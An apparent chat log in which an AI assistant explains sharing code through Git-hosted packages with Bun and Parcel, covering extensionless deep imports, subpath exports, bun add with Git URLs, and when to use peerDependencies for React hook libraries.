You import it directly using the string name you defined:

javascript

```
import { something } from 'super-utils';
```

Use code with caution.

***

### The Only Thing That _Will_ Break You

Even if you don't care what others do, there is **one hard operational limit** you must keep in mind:

If your app ever needs to install a _real_ public npm package that internally depends on a public library also named `super-utils`, npm will throw a **Dependency Conflict Error** and freeze your installation. Npm cannot put two completely different packages into the exact same folder name (`node_modules/super-utils`).

As long as your chosen name is reasonably distinct from common public libraries, your app will install and run perfectly.

To write out the final `package.json` files for your project, let me know:

- What is the **exact name** you want to use?
- What is the **Git URL** of your shared repository?

## can i import from util/folder/file

can i import from util/folder/file

8:14 PM

Yes, you can import deep paths like `my-shared-utils/folder/file` using the npm plus Git approach, but **only if the files exist in that exact structure inside the downloaded repository.**

Because npm downloads your Git repository and places its contents directly into `node_modules/my-shared-utils/`, any internal subfolder or file becomes instantly importable.

### Example Folder Structure in your Shared Git Repo:

text

```
shared-deps-repo/
├── package.json
└── folder/
    └── file.js  <-- (Contains: export function myFunc() {})
```

Use code with caution.

### The Import Statement in your App:

If your files are structured like the example above, you can import from the deep path without any extra configuration:

javascript

```
import { myFunc } from 'my-shared-utils/folder/file.js';
```

Use code with caution.

_(Note: If you are using standard Node.js ES Modules or TypeScript, you must include the file extension like `.js` or `.ts` in the import string unless you use a bundler)._

***

### The Build Step Catch ⚠️

This setup works flawlessly if your shared repository contains **plain, uncompiled JavaScript files**.

However, if your shared repository uses **TypeScript** or a build tool, you have to be careful. If your source files live in `src/folder/file.ts` but your build tool outputs them into a `dist/` folder, your developers would be forced to write imports that leak the build directory:

javascript

```
// Avoid this messy import if you have a build step
import { myFunc } from 'my-shared-utils/dist/folder/file.js';
```

Use code with caution.

If you have a build step and want to clean up those imports, you can map them natively using **Subpath Exports** inside your shared project's `package.json`. Let me know if your shared repository needs to be compiled before use!

## what if i do not suffix js/ts

what if i do not suffix js/ts

8:14 PM

If you do not want to use file extensions (like `/file.js` or `/file.ts`) in your deep imports, the modern, standard way to handle this in your shared repo's `package.json` is using **Subpath Exports**.

This allows you to map clean import paths (like `my-shared-utils/folder/file`) directly to the actual files inside your repository.

***

### Step 1: Configure `exports` in the Shared Repo

In the `package.json` of your **shared Git repository**, add the `exports` field. This acts as a router for your files:

json

```
{
  "name": "my-shared-utils",
  "version": "1.0.0",
  "type": "module",
  "exports": {
    "./folder/file": "./folder/file.js"
  }
}
```

Use code with caution.

- **Left side (`"./folder/file"`)**: The extensionless string the developer types when importing.
- **Right side (`"./folder/file.js"`)**: The actual physical file that Node.js will execute.

#### 💡 The Pro-Tip: Catch-All Pattern

If you have dozens of folders and files, you don't want to map them manually one by one. You can use a wild card (`*`) to automatically allow extensionless imports for **every single file** in a folder:

json

```
{
  "name": "my-shared-utils",
  "version": "1.0.0",
  "type": "module",
  "exports": {
    "./folder/*": "./folder/*.js"
  }
}
```

Use code with caution.

***

### Step 2: Import Without Suffixes in Your App

Once the shared repository is downloaded via `npm install`, you can cleanly import from your deep paths without any extensions:

javascript

```
import { myFunc } from 'my-shared-utils/folder/file';
```

Use code with caution.

***

### When Can You Drop Extensions with NATIVE Node.js?

If you completely refuse to use the `exports` field or config files, Node.js will **only** let you drop the extension if you fall back to the older, legacy CommonJS module format:

1. Change `"type": "module"` to `"type": "commonjs"` (or remove it entirely) in your `package.json`.
2. Change your imports/exports to `require()` and `module.exports`.

If you are using modern ES Modules (`import`/`export`), **Node.js strictly mandates file extensions** unless a tool like a bundler or the `exports` field resolves it for the runtime.

To ensure your runtime handles this correctly without errors, tell me:

- Are you running this code directly in **Node.js**, or are you compiling it with a bundler like **Vite or Next.js**?
- Is your project using **TypeScript** or standard **JavaScript**?

## does bun run wo ext

does bun run wo ext

8:15 PM

<mark><strong><span>Yes, Bun runs perfectly without file extensions.</span></strong></mark> In fact, one of Bun's main design goals is to completely eliminate module resolution headache—meaning you never have to worry about `.js` vs `.ts` extensions, or CommonJS vs ES Modules. [link](https://bun.com/docs/runtime/module-resolution)

If you are using the native npm plus Git architecture we discussed, Bun handles everything automatically at runtime.

### How Bun Resolves Extensions Automatically

When you write a deep import without an extension in Bun, it automatically searches your folders for a match. For example, if you write: [link](https://bun.com/docs/runtime/module-resolution)

javascript

```
import { myFunc } from 'my-shared-utils/folder/file';
```

Use code with caution.

Bun will search inside `node_modules/my-shared-utils/folder/` for the following files in this exact order: [link](https://bun.com/docs/runtime/module-resolution)

1. `file.tsx`
2. `file.ts`
3. `file.jsx`
4. `file.js`
5. _(It will even check for `file/index.ts` or `file/index.js` if it's a folder)_ [link](https://bun.com/docs/runtime/module-resolution)

### Why Bun is Perfect for Your Custom Git Approach

Because Bun has an internal, lightning-fast TypeScript transpiler built directly into the engine, it gives you two massive advantages for your architecture: [link](https://flaviocopes.com/what-happens-when-bun-runs-typescript/)

1. **No Shared Build Step Required:** Your shared repository can be written entirely in raw TypeScript (`.ts`). You don't need to compile it or output a `dist/` folder. Bun reads the `.ts` files inside `node_modules` and executes them on the fly instantly. [link](https://medium.com/@nikhilc2209/diving-deep-into-the-world-of-bun-js-4ebf5a3c4227)
2. **Zero `tsconfig` or `package.json` Exports Needed:** Since Bun natively rolls through the extension list fallback automatically, you do not need to configure subpath `exports` in your `package.json` just to drop extensions. [link](https://bun.com/docs/runtime/module-resolution)

### The Bottom Line

If your team switches their runtime from Node.js to Bun (`bun run index.js`), **you can drop all file extensions from your imports immediately.** It will natively find and run the files out-of-the-box. [link](https://blog.appsignal.com/2024/05/01/when-to-use-bun-instead-of-nodejs.html)

Are you planning to run your projects entirely using **Bun**, or do some parts of your architecture still need to support vanilla **Node.js**?

- [link](https://bun.com/docs/runtime/module-resolution)\
  Bun\
  Module Resolution | Bun Docs\
  This rule follows the TypeScript compiler's file extension substitution, which lets source files reference each other by their com...
- [link](https://bun.com/docs/bundler)\
  Bun\
  Bundler | Bun Docs\
  terminal. bun build ./index.ts --outdir ./out. If you don't pass outdir to the JavaScript API, Bun does not write bundled code to ...
- [link](https://flaviocopes.com/what-happens-when-bun-runs-typescript/)\
  flaviocopes.com\
  What happens when Bun runs a TypeScript file\
  This is why a module-resolution error can point at a file you never mentioned on the command line. Bun is building a graph, not re...

Show all

## what about parceljs

what about parceljs

8:15 PM

**Yes, ParcelJS completely supports importing without file extensions** out of the box.

Just like Bun, Parcel uses a robust, built-in module resolution algorithm designed to strip away configurations and make development as frictionless as possible.

### How Parcel Resolves Extensions Automatically

When Parcel compiles your application and encounters a deep import like this:

javascript

```
import { myFunc } from 'my-shared-utils/folder/file';
```

Use code with caution.

It instantly looks inside your `node_modules/my-shared-utils/folder/` directory and checks for files matching that name in a specific priority order:

1. `file.ts` / `file.tsx` \[1, 2]
2. `file.js` / `file.jsx` \[1, 2]
3. `file/index.ts` / `file/index.js` (If `file` is actually a directory) \[1, 2]

### Why Parcel is Perfect for Your Git Workflow

If you choose Parcel as your build tool, you get two major benefits for your specific npm-plus-Git setup:

1. **Zero Configuration Needed:** You don’t need to write a single line of `tsconfig` path mapping or configure complex `exports` objects inside your shared package’s `package.json`. Parcel infers the relationship and hooks the files together automatically.
2. **Automatic TypeScript Transpilation:** Parcel has a built-in TypeScript compiler. This means your shared Git repository can hold raw `.ts` or `.tsx` files without a pre-compile or build step. When Parcel bundles your main application, it will reach into `node_modules`, read the raw TypeScript files from your shared repo, and bundle them seamlessly into web-ready JavaScript.

### The Core Difference: Runtime vs. Build Time

Keep this one distinction in mind if you are choosing between tools:

- **Bun** resolves and compiles these extensionless files _at runtime_ when you execute your code (`bun run app.js`).
- **Parcel** resolves and compiles these extensionless files _at build/bundle time_ to output static files for deployment (`parcel build index.html`).

Both tools completely free you from having to type `.js` or `.ts` suffixes on your deep imports.

Are you using **Parcel** to bundle a web frontend application (like a Single Page App with an `index.html` entry point), or are you building something else? I can provide the exact start and build scripts for your `package.json`.

## how to bun add a git pkg

how to bun add a git pkg

8:16 PM

To install a package directly from a Git repository using **Bun**, you use the `bun add` command followed by the Git URL.

Bun natively supports multiple formats depending on how your repository is hosted and how you authenticate.

***

### 1. The Standard HTTPS Method (Public or Personal Repos)

If your repository is public, or if your machine handles HTTPS authentication via a global Git manager, run:

bash

```
bun add my-shared-utils@git+https://github.com
```

Use code with caution.

- **`my-shared-utils`**: The exact folder name you want Bun to create inside your `node_modules`.
- **`@git+https://...`**: Tells Bun to pull the package via Git HTTPS protocol.

***

### 2. The SSH Method (Recommended for Corporate/Private Repos)

If your team uses SSH keys to access private repositories (e.g., GitHub, GitLab, Bitbucket), use the SSH format. This seamlessly passes your local SSH keys to the Git server:

bash

```
bun add my-shared-utils@git+ssh://git@://github.com
```

Use code with caution.

***

### 3. The Ultra-Fast Shorthand Method (GitHub Only)

If your repository is hosted on GitHub, Bun provides an incredibly clean shorthand that bypasses the long URL string entirely:

bash

```
bun add username/repo
```

Use code with caution.

- This automatically maps the folder name in `node_modules` to the repository name.
- If it is a private GitHub repo, Bun will automatically pick up your local Git credentials over HTTPS/SSH.

***

### Pinning Specific Branches, Tags, or Commits

Just like npm, you can append a `#` symbol to the end of your `bun add` command to ensure developers are locked to a specific version instead of pulling blindly from the default branch:

- **Lock to a Tag:** `bun add username/repo#v1.0.4`
- **Lock to a Branch:** `bun add username/repo#dev`
- **Lock to a Commit Hash:** `bun add username/repo#a1b2c3d`

***

### What it looks like in your `package.json`

Once you run the command, Bun will instantly update your `package.json` dependencies to track the Git link natively:

json

```
{
  "dependencies": {
    "my-shared-utils": "github:username/repo#v1.0.4"
  }
}
```

Use code with caution.

When another developer clones your application, they simply run a bare `bun install`. Bun will read that string, authenticate, download your extensionless shared dependency, and mount it into `node_modules` immediately.

To make sure the installation goes through flawlessly:

- Do your developers authenticate with your Git host using **SSH keys** (`git@github.com`) or **Personal Access Tokens / HTTPS**?
- Are you hosting on **GitHub**, **GitLab**, or an **on-premise server**?

## how do they know the pkg name if i run bun add username/repo

how do they know the pkg name if i run bun add username/repo

8:17 PM

When you run `bun add username/repo`, <mark>Bun<span> </span><strong>automatically reads the<span> </span><code dir="ltr">package.json</code><span> </span>file inside that remote repository</strong><span> </span>during the download process</mark> to find out what its real package name is.

Here is exactly how Bun handles it behind the scenes:

### 1. Bun Inspects the Remote `package.json`

When you execute the shorthand command, Bun clones the repository into a temporary folder and looks at its root `package.json`.

If your remote repository's `package.json` looks like this:

json

```
{
  "name": "super-utils",
  "version": "1.0.0"
}
```

Use code with caution.

Bun grabs that `"name"` field (`super-utils`) and uses it to create the folder name inside your local `node_modules/`.

### 2. What it updates in your Application's `package.json`

Even though you ran `bun add username/repo`, Bun will write the **actual package name** on the left side of your dependencies object, and mapping the shorthand URL to the right side:

json

```
{
  "dependencies": {
    "super-utils": "github:username/repo"
  }
}
```

Use code with caution.

### 3. How You Import It

Because Bun mapped it to the real name defined by the package itself, your code imports it completely independent of the GitHub username or repository layout:

javascript

```
import { myFunc } from 'super-utils/folder/file';
```

Use code with caution.

***

### What if the remote `package.json` doesn't have a name?

If the remote repository doesn't have a `package.json` file, or if the `"name"` field is completely missing, Bun will fallback to naming the folder after the **GitHub repository name** itself.

However, as long as you have a proper `package.json` sitting in your shared repository, Bun will perfectly sync the real name automatically every time.

Are you ready to test out running **`bun add`** on your shared repository, or do you need help setting up the **SSH/HTTPS credentials** so Bun can access it if the repo is private?

## do deps have to declare their own deps, or can they rely if the projects also have them installed on node modules on the projects, or if i ensure they are on globalthis before they run

do deps have to declare their own deps, or can they rely if the projects also have them installed on node modules on the projects, or if i ensure they are on globalthis before they run

8:20 PM

Yes, a shared dependency **can** rely on the main project’s `node_modules` or `globalThis` without declaring them as strict `dependencies`. However, the approach you take drastically changes how robust and clean your architecture will be.

Here are the three ways to handle this, ranked from best practice to chaotic workaround:

***

### 1. The Right Way: Use `peerDependencies`

If your shared package needs a dependency (like `lodash` or `react`) but you want it to use the exact version installed by the main application to avoid duplication, you list it as a **`peerDependency`** in the shared repo's `package.json`:

json

```
{
  "name": "my-shared-utils",
  "peerDependencies": {
    "lodash": "^4.0.0"
  }
}
```

Use code with caution.

- **How it works:** This tells Bun/npm: _"I need lodash to function, but don't download a separate copy for me. Look at the main application's `node_modules` and use theirs."_
- **Why it's great:** It maintains strict type safety, editor auto-complete, and cleanly throws an error if a developer forgets to install `lodash` in the main application.

***

### 2. The Lazy Way: Implicit Resolution (No declaration at all)

If your shared code just calls `import _ from 'lodash'` but declares absolutely **nothing** in its own `package.json`, it can still work due to how Node.js and Bun look for packages.

- **How it works:** When your app runs and enters the shared folder, the runtime looks for `node_modules/lodash`. If it doesn't find it inside the shared folder, it **walks up the folder tree** until it reaches the main application's root `node_modules`.
- **The Danger:** This is called a **phantom dependency**. While it usually works during development, it can randomly break during production builds, when packages are hoisted differently, or if you run your tests in isolation. Your IDE will also likely flag it with a red underline error because it cannot guarantee the file exists.

***

### 3. The `globalThis` Way: Runtime Pollution

You can absolutely attach things to `globalThis` in your main project before executing your shared code.

**In your App Project:**

javascript

```
// Must run first!
globalThis.mySharedConfig = { apiToken: "xyz123" };
globalThis.globalLodash = await import('lodash');

import { mySharedFunc } from 'my-shared-utils/file';
```

Use code with caution.

**In your Shared Project:**

javascript

```
export function mySharedFunc() {
  // Pulls directly from global memory scope
  const token = globalThis.mySharedConfig.apiToken;
  const _ = globalThis.globalLodash;
}
```

Use code with caution.

- **Why you might do this:** This is incredibly common for micro-frontends, global configuration environments, or passing database instances down to shared utilities without importing them.
- **The Catch:** You lose all TypeScript type definitions on `globalThis` unless you manually declare global interfaces. It also creates a strict execution order dependency: if anyone accidentally imports your shared library before the global variables are set up, the application will instantly crash with an `Undefined` error.

***

### Which should you choose?

- Choose **`peerDependencies`** if you are dealing with standard NPM packages (like `lodash`, `axios`, or `react`).
- Choose **`globalThis`** only if you are passing a highly specific runtime state, like an active database connection pool or global environment configurations.

Are the dependencies you are trying to share standard **utility libraries** (like lodash/axios), or are they **runtime instances** (like a database client or an initialized configuration object)?

## what if i just add them normally in deps

what if i just add them normally in deps

8:23 PM

If you add them as normal `"dependencies"` inside your shared package’s `package.json`, <mark><strong>it will work perfectly out of the box.</strong></mark> This is actually the standard way to build self-contained packages.

json

```
{
  "name": "super-utils",
  "dependencies": {
    "axios": "^1.6.0"
  }
}
```

Use code with caution.

However, because you are using **Bun**, there is a massive behavioral difference you need to know about regarding how your dependencies are stored and loaded compared to Node.js.

### 1. Bun Deduplicates Everything Automatically

In the old Node.js days, if your main app used `axios@1.6.0` and your shared Git package _also_ used `axios@1.6.0`, Node might download two separate copies, creating massive `node_modules` folders.

**Bun prevents this entirely.** Bun uses a global content-addressable cache and hard-links duplicate packages. If both your app and your shared package require the exact same version of a dependency, Bun downloads it **exactly once** onto your machine. It then virtually links it so both the app and the shared folder share the exact same code on your disk.

### 2. The Singleton Trap ⚠️ (The Only Real Risk)

While Bun fixes the file size problem, adding libraries normally to dependencies can create runtime bugs with **Stateful Libraries**.

- **Stateless Libraries (Safe):** If the dependency is just functions (like `lodash`, `date-fns`, or `uuid`), normal dependencies are perfectly fine.
- **Stateful Libraries (Dangerous):** If the dependency holds internal memory state (like **React**, **Vue**, **Redux**, or a database driver like **Prisma**), you _cannot_ let the shared package have its own separate dependency.

If the shared package pulls its own instance of a stateful library, your application will load **two separate instances** into your computer's memory. For example, if it's React, your app will crash with an error stating you broke the rules of hooks, because your shared components are talking to a completely different React engine than your main application.

### The Cheat Sheet Rule

- If the dependency is a utility (e.g., `axios`, `lodash`, `crypto`): **Add it normally to `dependencies`.** It's safer because the shared package guarantees it has what it needs.
- If the dependency is a framework or state manager (e.g., `react`, `react-dom`, `vue`, `graphql`): **Do not add it normally.** Use `peerDependencies` instead to force them to share the exact same memory instance.

To ensure you don't fall into the singleton trap, what are a few of the **specific libraries** your shared package needs to run?

## what if i just add react normally in deps

what if i just add react normally in deps

8:25 PM

If you add **React** normally to your shared package's `"dependencies"`, <mark><strong>your application will almost certainly break at runtime.</strong></mark>

Even if Bun successfully dedupes the files on your hard drive, the JavaScript execution engine will load **two separate instances of React into your computer's memory**:

1. One instance for your main application.
2. A completely separate instance for the code inside your shared Git repository.

***

### The Symptoms: What Happens Next

When you run your application, you will encounter immediate, fatal runtime bugs:

1. **The "Invalid Hook Call" Error:** This is the most famous React error. React tracks hook states (like `useState` or `useEffect`) globally within its active memory instance. If your shared component tries to execute a hook, it will call the shared package's instance of React instead of the main application's instance. React will get confused and crash the entire page.
2. **Context Provider Failures:** If you wrap your app in a `ContextProvider` (like for themes, authentication, or routing), any shared components inside your Git package will read from their own isolated React instance. They will completely fail to see the context data from the main application, acting as if the provider doesn't exist.

***

### The One Exception: It ONLY works if versions are 100% identical

Because Bun uses a unified dependency resolution algorithm, it will attempt to completely flatten the tree. If your main application's `package.json` and your shared Git repository's `package.json` require the **exact same semantic version range** of React (e.g., both say `"react": "^19.0.0"`), Bun will enforce a single layout and map both to the exact same memory instance.

However, this makes your setup **extremely brittle**. The moment a developer runs `bun update` in the main application—bumping it to a slightly newer version of React than the shared Git repository—Bun will immediately split them into two separate versions, and your application will instantly crash with the errors above.

***

### How to Fix React (The Bulletproof Solution)

For React, you must strictly avoid `"dependencies"` and use **`peerDependencies`** instead.

**Inside your shared Git package's `package.json`:**

json

```
{
  "name": "my-shared-components",
  "version": "1.0.0",
  "peerDependencies": {
    "react": "^18.0.0 || ^19.0.0",
    "react-dom": "^18.0.0 || ^19.0.0"
  }
}
```

Use code with caution.

- **What this does:** It tells Bun: _"This component library is built for React, but do not download or install React inside my folder. Use whatever version of React the main application is running."_
- **The Result:** Only **one** instance of React enters your memory layout, and your custom setup remains lightning-fast, extensionless, and perfectly stable.

Are you building **UI components** (like buttons, modals, or forms) inside this shared package, or is it strictly **custom React Hooks and business logic**? I can give you a clean boilerplate template for your shared React package.

## do ppl add peer deps to create custom hook libs, how

do ppl add peer deps to create custom hook libs, how

8:26 PM

Yes, **virtually every custom hook library in the world uses `peerDependencies`** for React. Big open-source packages like `react-use`, `usehooks-ts`, and TanStack Query use this exact pattern to prevent the "Invalid Hook Call" error.

Here is how you set up a custom hook library using your **npm plus Git + Bun** approach without any compilation or extension tricks.

***

### Step 1: The Custom Hook Repo (`package.json`)

Inside your shared Git repository, define `react` as a peer dependency. You can also specify `devDependencies` so you can still use TypeScript auto-complete while developing the hooks themselves.

json

```
{
  "name": "my-custom-hooks",
  "version": "1.0.0",
  "private": true,
  "peerDependencies": {
    "react": "^18.0.0 || ^19.0.0"
  },
  "devDependencies": {
    "react": "^19.0.0"
  }
}
```

Use code with caution.

### Step 2: Write Your Extensionless Hooks

Create your hook files using raw TypeScript. Because you are using Bun, you don't need a build step, and you don't need to put `.ts` or `.tsx` at the end of your file imports.

**File: `useBoolean/index.ts`**

typescript

```
import { useState, useCallback } from 'react';

export function useBoolean(initialValue = false) {
  const [value, setValue] = useState(initialValue);
  const setTrue = useCallback(() => setValue(true), []);
  const setFalse = useCallback(() => setValue(false), []);
  const toggle = useCallback(() => setValue(v => !v), []);

  return [value, { setTrue, setFalse, toggle }] as const;
}
```

Use code with caution.

***

### Step 3: Install It in Your Main App

In your main application (which already has `react` installed normally), use Bun to pull your hook repository directly from Git:

bash

```
bun add username/my-custom-hooks-repo
```

Use code with caution.

Your main application's `package.json` will look like this:

json

```
{
  "name": "my-main-app",
  "dependencies": {
    "my-custom-hooks": "github:username/my-custom-hooks-repo",
    "react": "^19.0.0",
    "react-dom": "^19.0.0"
  }
}
```

Use code with caution.

***

### Step 4: Import and Use Without Extensions

Because Bun natively resolves deep paths and scans for matching TypeScript files, you can import your custom hooks directly through the clean subfolder structure:

tsx

```
// my-main-app/src/Component.tsx
import { useBoolean } from 'my-custom-hooks/useBoolean';

export default function ToggleComponent() {
  const [isOpen, { toggle }] = useBoolean(false);

  return (
    <button onClick={toggle}>
      {isOpen ? "Open" : "Closed"}
    </button>
  );
}
```

Use code with caution.

### Why this setup is perfect:

1. **Zero Runtime Crashing:** Because `react` is a peer dependency, your custom hooks hook directly into the main application's instance of React.
2. **Instant Hot Reloading:** If you update the code inside the Git repo and run `bun install` again, Bun swaps out the files. There is no build script or `npm run build` step required inside your hook library.
3. **Clean Code:** Your import strings look exactly like professional NPM modules without leaking nasty file extensions or structural paths.

Would you like a second example showing how to structure an **`index.ts` barrel file** at the root of your hook library so you can import multiple hooks at once (e.g., `import { useBoolean, useWindowSize } from 'my-custom-hooks'`), or do you prefer the deep-path folder imports?

## how to "add" a peer dep, or can i, like add will add normal dep, add -D will add dev dep

how to "add" a peer dep, or can i, like add will add normal dep, add -D will add dev dep

8:27 PM

You cannot add a peer dependency using a command like `bun add -P` because **Bun does not have a dedicated CLI flag to add peer dependencies automatically.**

If you run `bun add react`, it will always put it in your normal `dependencies`. If you run `bun add -D react`, it will put it in `devDependencies`.

To add a peer dependency, you must use one of the two standard workflows below:

***

### Method 1: The Fast Manual Way (Recommended)

Because you are managing your own internal custom repository, the easiest way is to simply open the `package.json` file of your shared hook library in your text editor and type it out yourself under a `"peerDependencies"` key:

json

```
{
  "name": "my-custom-hooks",
  "version": "1.0.0",
  "peerDependencies": {
    "react": "^18.0.0 || ^19.0.0"
  }
}
```

Use code with caution.

### Method 2: The CLI "Move" Way

If you want to use the command line to ensure you grab the exact latest version string from npm, you can install it as a dev dependency first, and then manually move it or use a utility:

1. **Install it as a dev dependency** so TypeScript has the types during development:\
   bash

<!---->

```
bun add -D react
```

Use code with caution.
2\. Open your `package.json` and manually **copy or move** that exact version line from `devDependencies` into a new `peerDependencies` block:\
json

```
{
  "devDependencies": {
    "react": "^19.0.0"
  },
  "peerDependencies": {
    "react": "^19.0.0" // <-- Paste it here
  }
}
```

Use code with caution.

***

### ⚠️ Pro-Tip: Keep BOTH for Best Developer Experience

When building a custom library, it is standard practice to list React in **both** blocks:

1. **In `peerDependencies`:** Tells the consumer application running your code to use its own version of React at runtime.
2. **In `devDependencies`:** Tells Bun to install React _locally inside your shared repository folder only while you are developing it_, allowing your IDE (VS Code) to give you auto-complete and type-checking while writing your custom hooks.

Would you like help setting up a quick test or a documentation file for your developers so they know how to properly contribute to this shared hook library repository?

## search

search

8:27 PM

Actually, correction: **you can use a dedicated CLI flag to add peer dependencies in Bun!** [link](https://bun.com/docs/pm/cli/add)

Bun provides a built-in flag specifically for this: [link](https://bun.com/docs/pm/cli/add)

bash

```
bun add react --peer
```

Use code with caution.

### What this command does:

1. **Updates `package.json`**: It will automatically create (or append to) the `"peerDependencies"` object inside your shared custom hook package and add the specified version string: [link](https://bun.com/guides/install/add-peer)\
   json

<!---->

```
{
  "peerDependencies": {
    "react": "^19.0.0"
  }
}
```

Use code with caution.
2\. **Skips double installing**: Because Bun's package manager handles peer dependencies automatically by default, it knows it does not need to append a duplicate entry into your regular `dependencies`. [link](https://oneuptime.com/blog/post/2026-01-31-bun-package-manager/view)

### Summary of Bun's Package Manager Flags:

To easily manage your shared custom package architecture using the CLI, remember these three main modifiers: [link](https://bun.com/guides/install/add-optional)

| Command                | Destination Block in `package.json` | Use Case                                                             |
| ---------------------- | ----------------------------------- | -------------------------------------------------------------------- |
| `bun add <pkg>`        | `"dependencies"`                    | Production utils (like `axios` or `lodash`)                          |
| `bun add <pkg> -D`     | `"devDependencies"`                 | Build tools, TypeScript types (`@types/react`), or test suites       |
| `bun add <pkg> --peer` | `"peerDependencies"`                | Memory-sensitive frameworks / runtimes (like `react` or `react-dom`) |

Now that your shared repository layout is configured with the correct `peerDependencies`, would you like help writing a **GitHub Action workflow** to automatically track updates when your developers make changes to your custom hook code?

- [link](https://www.search.org/)\
  www.search.org\
  Home - SEARCH\
  SEARCH is the premier resource for collecting, sharing, and analyzing innovative and timely knowledge, information, best practices...
- [link](https://bun.com/guides/install/add-peer)\
  Bun\
  Add a peer dependency | Bun Guides\
  To add an npm package as a peer dependency, use the --peer flag. This adds the package to peerDependencies in package. installs pe...
- [link](https://bun.com/docs/pm/cli/add)\
  Bun\
  bun add | Bun Docs\
  To add a package as a peer dependency. Bun installs peer dependencies by default, so no additional devDependencies entry is needed...

Show all

## do ppl add peer deps, when where

do ppl add peer deps, when where

8:28 PM

People use **`peerDependencies`** exclusively when they are writing a **reusable code library or plugin** rather than a standalone app. [link](https://medium.com/@afnank/the-mystical-world-of-npm-dependencies-peer-dependencies-why-npm-i-force-is-not-the-best-idea-0ae24eb03053)

The core rule is: Use a peer dependency when your library needs a specific tool to function, but that tool **must be owned, configured, and instantiated by the parent application**. [link](https://dev.to/antozanini/a-complete-guide-to-regular-dev-and-peer-dependencies-in-npm-57j9)

Here is exactly **when** and **where** people add them across the industry:

***

### 1. When Building UI Component / Hook Libraries

**The Scenario:** You are writing reusable buttons, forms, or custom React hooks (like the ones in your Git repository). [link](https://dev.to/antozanini/a-complete-guide-to-regular-dev-and-peer-dependencies-in-npm-57j9)

- **The Dependency:** `react`, `react-dom`.
- **Why:** As we discussed, React tracks states globally in memory. If your component library brings its own hidden copy of React, the page crashes. By making it a peer dependency, your components tap directly into the host app's active React context. [link](https://stackoverflow.com/questions/26737819/why-use-peer-dependencies-in-npm-for-plugins)

### 2. When Building Framework Plugins or Extensions

**The Scenario:** You are writing an official or community plugin that hooks into a larger tool (e.g., a custom middleware for an Express server, or a linting plugin). [link](https://dev.to/dianjuar/npm-peerdependencies-in-depth-a-comprehensive-introduction-1o6g)

- **The Dependencies:** `express`, `eslint`, `vite`, `tailwindcss`.
- **Why:** A plugin cannot run without its parent framework. If a plugin named `vite-plugin-image` installed its own hidden version of `vite` inside `node_modules`, it would be trying to run a build server inside a build server. It needs to leverage the exact global instance of Vite running the main project. [link](https://dev.to/dianjuar/npm-peerdependencies-in-depth-a-comprehensive-introduction-1o6g)

### 3. When Sharing Heavy State / Database Clients

**The Scenario:** You are writing an internal corporate data layer library that contains your shared Prisma schemas or database queries.

- **The Dependency:** `@prisma/client`, `graphql`.
- **Why:** You only want **one single database connection pool** open across your application infrastructure. If your shared package has a regular dependency on a database driver, it might instantiate its own separate pipeline, exhausting your server's available database connections. [link](https://www.johno.com/using-peer-dependencies)

***

### Where they are added (`package.json` vs Visual Structure)

Conceptually, you can visualize the difference like this:

#### Regular Dependencies (`dependencies`) ➡️ **A Downward Chain**

The main app downloads your library, and your library reaches down to download its own private tools. They are **hidden implementation details**.\
_(Example: Your library uses `axios` to fetch data. The parent app doesn't need to know or care that you use Axios under the hood)._ [link](https://medium.com/@tapaswim/npm-dependencies-vs-peer-dependencies-16f43d6c7e45)

#### Peer Dependencies (`peerDependencies`) ➡️ **An Upward Handshake**

Your library looks _up_ and says: _"Hey parent app, I'm plugging into you, but you must already have this specific item installed and waiting for me to use."_ [link](https://medium.com/@afnank/the-mystical-world-of-npm-dependencies-peer-dependencies-why-npm-i-force-is-not-the-best-idea-0ae24eb03053)

text

```
[ Parent Application ]
   │
   ├──► Has React installed (v19)
   │
   └──► Downloads [ Your Custom Library ]
            │
            └── (peerDependencies: React) ──► Hooks directly into the Parent's React!
```

Use code with caution.

### Summary Check

If you are asking yourself whether a dependency belongs in `dependencies` or `peerDependencies` for your shared package, ask this one question:

> _"Does the parent application need to share the exact same memory instance, global state, or configuration of this package at runtime?"_

- If **Yes** (React, Vue, Tailwind, Express, Prisma): **`peerDependencies`**
- If **No** (Lodash, Axios, Date-fns, Crypto-js): **`dependencies`**

Are there any **other third-party tools** (like styles, state managers, or data fetchers) you are planning to add to your custom hook library that you're unsure how to categorize?

- [link](https://dev.to/antozanini/a-complete-guide-to-regular-dev-and-peer-dependencies-in-npm-57j9)\
  DEV Community\
  A Complete Guide to Regular, Dev, and Peer Dependencies in npm\
  Simply put, when a package has a peer dependency, it means that it requires a specific version of another package to work correctl...
- [link](https://medium.com/@afnank/the-mystical-world-of-npm-dependencies-peer-dependencies-why-npm-i-force-is-not-the-best-idea-0ae24eb03053)\
  Medium\
  The Mystical World of npm Dependencies, peer-dependencies, legacy peer dependencies and why I should stop using npm i — -force | by Sayed Afnan Khazi | Medium\
  Dependencies go downwards, but peer dependencies can point upwards or sideways. If npm doesn't know how to resolve conflicting dep...
- [link](https://dev.to/dianjuar/npm-peerdependencies-in-depth-a-comprehensive-introduction-1o6g)\
  DEV Community\
  NPM peerDependencies in Depth: A Comprehensive ...\
  \#javascript #npm #node #webdev As Javascript developers, we all know two different dependencies in our projects, dependencies and ...

Show all

## what if i add everything as peer dep

what if i add everything as peer dep

8:28 PM

If you add **absolutely everything** as a peer dependency (including standard utility libraries like `lodash` or `axios`), <mark>your shared library becomes what is known as a<span> </span><strong>zero-dependency package</strong></mark>.

While this makes your shared package incredibly lightweight to download, it shifts a massive configuration and maintenance burden onto the developers managing the main applications.

Here is exactly what happens if you go down this path:

***

### 1. The Good: Perfect Control Over Code Splitting

Because your shared library contains no dependencies of its own, it acts as a pure layer of logic.

- **The Benefit:** There is zero risk of dependency duplication or version mismatching across your entire system. The host application has absolute, dictatorial control over every single byte of code that ends up in the final bundle.

### 2. The Bad: Complete Configuration Hell for Applications

When a developer creates a brand new project and runs `bun add username/my-shared-hooks`, they will be greeted with a massive wall of installation warnings.

Because everything is a peer dependency, your shared package tells the host app: _"I won't work unless you manually download all of these files yourself."_ The developer is now forced to manually install every single utility your library uses:

bash

```
# The developer has to run this just to use your library
bun add axios lodash date-fns jose uuid react react-dom
```

Use code with caution.

If your shared library introduces a new helper file next week that imports a tiny library like `uuid`, **every single application using your library will instantly crash** upon updating until those developers manually modify their own `package.json` files to add `uuid`.

### 3. The Ugly: Breaking the Principle of Encapsulation

In software architecture, you want code to be **encapsulated**. A developer importing a function from your library should only care about what that function _returns_, not the hidden plumbing inside it.

- **How it should be:** A developer calls `getWeather()` from your library. They don't know (or care) that you use `axios` under the hood to fetch it.
